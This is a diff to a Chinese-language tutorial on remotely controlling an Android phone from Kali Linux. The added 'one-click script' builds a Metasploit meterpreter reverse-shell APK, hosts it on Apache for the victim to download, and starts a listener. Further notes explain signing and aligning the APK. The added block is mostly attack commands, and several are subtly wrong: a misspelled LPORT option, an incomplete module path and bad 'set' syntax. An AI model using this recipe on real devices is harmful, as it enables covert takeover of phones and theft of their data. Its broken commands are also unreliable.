@@ -19,6 +19,18 @@
 [![fqVzkT.png](https://z3.ax1x.com/2021/08/19/fqVzkT.png)](https://imgtu.com/i/fqVzkT)
 10. 在靶机上访问Kali的IP地址，找到app.apk然后就可以在Kali上控制手机了<br>
 <br>
+一键脚本：<br>
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.110 LPOST=8888 R > app.apk<br>
+service apache2 start<br>
+sudo cp app.apk /var/www/html<br>
+rm /var/www/html/index.html<br>
+msfconsole<br>
+use exploit/multi<br>
+set payload android/meterpreter/reverse_tcp<br>
+set LPORT=8888<br>
+set LHOST=192.168.1.110<br>
+exploit<br>
+<br>
 注：<br>
 1. 可以使用zipalign对apk进行对齐 zipalign -v 4 text.apk text1.apk<br>
 2. 可以生成密钥对 例如 keytool -genkey -v -keystore cg.keystore -alias cg -keyalg RSA -keysize 2048 -validity 10000  模板keytool -genkeypair -keystore 密钥库名 -alias 密钥别名 -validity 天数 -keyalg RSA<br>
